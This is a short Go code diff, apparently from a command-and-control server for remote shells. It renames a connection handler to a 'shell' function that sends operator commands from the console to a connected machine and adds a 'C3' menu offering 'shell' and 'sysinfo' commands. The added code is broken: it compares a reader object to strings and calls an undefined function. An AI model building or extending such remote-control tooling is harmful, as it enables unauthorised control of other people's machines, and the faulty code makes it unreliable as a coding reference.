@@ -9,7 +9,7 @@ import (
 )
 
 
-func handleConnection(conn net.Conn) {
+func shell(conn net.Conn) {
 	for {
 		fmt.Printf("[shell]: ")
 		reader := bufio.NewReader(os.Stdin)
@@ -27,6 +27,21 @@ func handleConnection(conn net.Conn) {
 		fmt.Println(string(result))
 	}
 	conn.Close()
+}
+
+
+func handleConnection(conn net.Conn) {
+	fmt.Printf("C3: ")
+	reader := bufio.NewReader(os.Stdin)
+
+	switch {
+		case reader == "shell":
+			shell(conn)
+		case reader == "sysinfo":
+			sysinfo(info)
+		default:
+			fmt.Println("Invalid command\n")
+	}
 }
 
 func main() {
